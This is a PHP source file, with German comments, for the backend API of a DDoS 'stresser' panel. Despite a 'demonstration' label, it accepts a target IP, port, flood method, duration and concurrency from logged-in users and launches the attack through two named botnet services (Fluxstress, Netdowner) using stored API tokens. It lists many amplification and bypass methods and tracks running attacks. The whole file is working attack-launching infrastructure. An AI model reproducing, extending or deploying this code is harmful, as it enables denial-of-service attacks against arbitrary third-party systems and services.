<?php
/**
 * API - Stresser Test (Demonstrationszwecke)
 * Unterstützt Master Botnet (Fluxstress) und Master Stresser (Netdowner)
 */

require_once __DIR__ . '/../config.php';

$method = $_SERVER['REQUEST_METHOD'];

switch ($method) {
    case 'GET':
        getActiveAttacks();
        break;
        
    case 'POST':
        startAttack();
        break;
        
    default:
        jsonError('Methode nicht erlaubt', 405);
}

/**
 * Aktive Angriffe abrufen
 */
function getActiveAttacks() {
    requireLogin();
    
    try {
        $pdo = getDbConnection();
        
        // Abgelaufene Angriffe aktualisieren
        $pdo->exec("
            UPDATE stresser_attacks
            SET status = 'completed'
            WHERE status = 'running' AND end_time <= NOW()
        ");
        
        // Aktive Angriffe abrufen
        $stmt = $pdo->prepare("
            SELECT 
                sa.id,
                sa.user_id,
                u.username,
                sa.attack_type,
                sa.botnet,
                sa.target_ip,
                sa.target_port,
                sa.method,
                sa.duration,
                sa.concurrents,
                sa.status,
                sa.start_time,
                sa.end_time,
                GREATEST(0, TIMESTAMPDIFF(SECOND, NOW(), sa.end_time)) as seconds_remaining
            FROM stresser_attacks sa
            JOIN users u ON sa.user_id = u.id
            WHERE sa.status = 'running'
            ORDER BY sa.start_time DESC
        ");
        $stmt->execute();
        $attacks = $stmt->fetchAll();
        
        // Gesamte Concurrents berechnen
        $totalConcurrents = 0;
        foreach ($attacks as $attack) {
            $totalConcurrents += $attack['concurrents'];
        }
        
        jsonSuccess([
            'attacks' => $attacks,
            'total_concurrents' => $totalConcurrents,
            'active_count' => count($attacks)
        ]);
        
    } catch (Exception $e) {
        error_log('Fehler beim Abrufen der Angriffe: ' . $e->getMessage());
        jsonError('Fehler beim Abrufen der Angriffe', 500);
    }
}

/**
 * Angriff starten
 */
function startAttack() {
    requireLogin();
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    $attackType = strtoupper($input['attack_type'] ?? '');
    $botnet = $input['botnet'] ?? '';
    $targetIp = trim($input['target_ip'] ?? '');
    $targetPort = (int)($input['target_port'] ?? 0);
    $method = strtoupper(trim($input['method'] ?? ''));
    $duration = (int)($input['duration'] ?? 0);
    $concurrents = (int)($input['concurrents'] ?? 1);
    
    // Validierung
    if (!in_array($attackType, ['L4', 'L7'])) {
        jsonError('Ungültiger Angriffstyp. Erlaubt: L4, L7');
    }
    
    if (!in_array($botnet, ['Master Botnet', 'Master Stresser'])) {
        jsonError('Ungültiges Botnet');
    }
    
    if (empty($targetIp)) {
        jsonError('Ziel-IP ist erforderlich');
    }
    
    if ($targetPort < 1 || $targetPort > 65535) {
        jsonError('Ungültiger Port (1-65535)');
    }
    
    if (empty($method)) {
        jsonError('Methode ist erforderlich');
    }
    
    if ($duration < 1 || $duration > 3600) {
        jsonError('Dauer muss zwischen 1 und 3600 Sekunden liegen');
    }
    
    if ($concurrents < 1) {
        jsonError('Mindestens 1 Concurrent erforderlich');
    }
    
    // Botnet-spezifische Validierung
    if ($botnet === 'Master Botnet') {
        if ($concurrents > FLUXSTRESS_MAX_CONCURRENTS) {
            jsonError('Maximum ' . FLUXSTRESS_MAX_CONCURRENTS . ' Concurrents für Master Botnet');
        }
        
        $validL4Methods = ['NTP', 'TCP-AMP', 'CLDAP', 'WSD', 'DNS', 'UDP', 'UDP-BYPASS', 'UDP-OVH', 'TCP-SYNACK', 'VSE', 'TCP-ACK', 'DOMINATE', 'TCP', 'TCP-BYPASS', 'TCP-OVH', 'TCP-SYN', 'BOTNET-HOME', 'GAME', 'ICMP', 'FIVEM', 'FORTNITE', 'GRE'];
        $validL7Methods = ['TLS-SPAM', 'TLS-VIP', 'COOKIE', 'CLOUDFLARE', 'BROWSER'];
        
        if ($attackType === 'L4' && !in_array($method, $validL4Methods)) {
            jsonError('Ungültige L4-Methode für Master Botnet');
        }
        if ($attackType === 'L7' && !in_array($method, $validL7Methods)) {
            jsonError('Ungültige L7-Methode für Master Botnet');
        }
    }
    
    try {
        $pdo = getDbConnection();
        
        // Angriff in Datenbank speichern
        $stmt = $pdo->prepare("
            INSERT INTO stresser_attacks (
                user_id, attack_type, botnet, target_ip, target_port,
                method, duration, concurrents, status, start_time, end_time
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running', NOW(), DATE_ADD(NOW(), INTERVAL ? SECOND))
        ");
        
        $stmt->execute([
            $_SESSION['user_id'],
            $attackType,
            $botnet,
            $targetIp,
            $targetPort,
            $method,
            $duration,
            $concurrents,
            $duration
        ]);
        
        $attackId = $pdo->lastInsertId();
        
        // API-Aufruf
        $apiResponse = callStresserApi($botnet, $targetIp, $targetPort, $method, $duration, $concurrents);
        
        // API-Response in DB speichern
        $updateStmt = $pdo->prepare("
            UPDATE stresser_attacks
            SET api_response = ?, attack_ids = ?
            WHERE id = ?
        ");
        
        $attackIds = isset($apiResponse['attack_ids']) ? json_encode($apiResponse['attack_ids']) : null;
        $updateStmt->execute([
            json_encode($apiResponse, JSON_UNESCAPED_UNICODE),
            $attackIds,
            $attackId
        ]);
        
        // Aktivität loggen
        logActivity($_SESSION['user_id'], 'attack_started', [
            'attack_id' => $attackId,
            'botnet' => $botnet,
            'target' => $targetIp . ':' . $targetPort,
            'method' => $method
        ]);
        
        jsonSuccess([
            'attack_id' => $attackId,
            'api_response' => $apiResponse,
            'message' => 'Angriff erfolgreich gestartet'
        ]);
        
    } catch (Exception $e) {
        error_log('Fehler beim Starten des Angriffs: ' . $e->getMessage());
        jsonError('Fehler beim Starten des Angriffs: ' . $e->getMessage(), 500);
    }
}

/**
 * Stresser API aufrufen
 */
function callStresserApi($botnet, $host, $port, $method, $time, $concurrents) {
    // API-Konfiguration aus Datenbank laden
    $pdo = getDbConnection();
    
    if ($botnet === 'Master Botnet') {
        $apiName = 'fluxstress';
    } elseif ($botnet === 'Master Stresser') {
        $apiName = 'netdowner';
    } else {
        throw new Exception('Unbekanntes Botnet');
    }
    
    $stmt = $pdo->prepare("SELECT api_url, api_token FROM api_configs WHERE api_name = ? AND is_active = 1");
    $stmt->execute([$apiName]);
    $config = $stmt->fetch();
    
    if (!$config) {
        throw new Exception('API-Konfiguration nicht gefunden');
    }
    
    // URL zusammenbauen
    if ($botnet === 'Master Botnet') {
        // Fluxstress API - einzelne Anfragen pro Concurrent
        $allResponses = [];
        
        for ($i = 0; $i < $concurrents; $i++) {
            $url = $config['api_url'] . '?' . http_build_query([
                'host' => $host,
                'port' => $port,
                'time' => $time,
                'method' => $method,
                'token' => $config['api_token']
            ]);
            
            $response = makeHttpRequest($url);
            $allResponses[] = $response;
            
            // Kleine Verzögerung zwischen den Anfragen
            if ($i < $concurrents - 1) {
                usleep(100000); // 100ms
            }
        }
        
        // Responses zusammenführen
        return mergeFluxstressResponses($allResponses);
        
    } else {
        // Netdowner API
        $url = $config['api_url'] . '?' . http_build_query([
            'host' => $host,
            'port' => $port,
            'time' => $time,
            'method' => $method,
            'concs' => $concurrents,
            'token' => $config['api_token']
        ]);
        
        return makeHttpRequest($url);
    }
}

/**
 * HTTP-Anfrage durchführen
 */
function makeHttpRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        throw new Exception('API-Anfrage fehlgeschlagen: ' . $error);
    }
    
    if ($httpCode !== 200) {
        throw new Exception('API-Fehler: HTTP ' . $httpCode);
    }
    
    $decoded = json_decode($response, true);
    if ($decoded === null) {
        throw new Exception('Ungültige API-Response');
    }
    
    return $decoded;
}

/**
 * Mehrere Fluxstress-Responses zusammenführen
 */
function mergeFluxstressResponses($responses) {
    if (empty($responses)) {
        return ['status' => 'error', 'message' => 'Keine Responses'];
    }
    
    $merged = [
        'status' => 'success',
        'message' => 'Attack successfully sent!',
        'host' => $responses[0]['host'] ?? '',
        'port' => $responses[0]['port'] ?? '',
        'method' => $responses[0]['method'] ?? '',
        'time' => $responses[0]['time'] ?? '',
        'concurrents' => count($responses),
        'attack_ids' => [],
        'attack_summary' => []
    ];
    
    foreach ($responses as $response) {
        if (isset($response['attack_ids'])) {
            $merged['attack_ids'] = array_merge($merged['attack_ids'], $response['attack_ids']);
        }
        if (isset($response['attack_summary'])) {
            $merged['attack_summary'] = array_merge($merged['attack_summary'], $response['attack_summary']);
        }
    }
    
    return $merged;
}
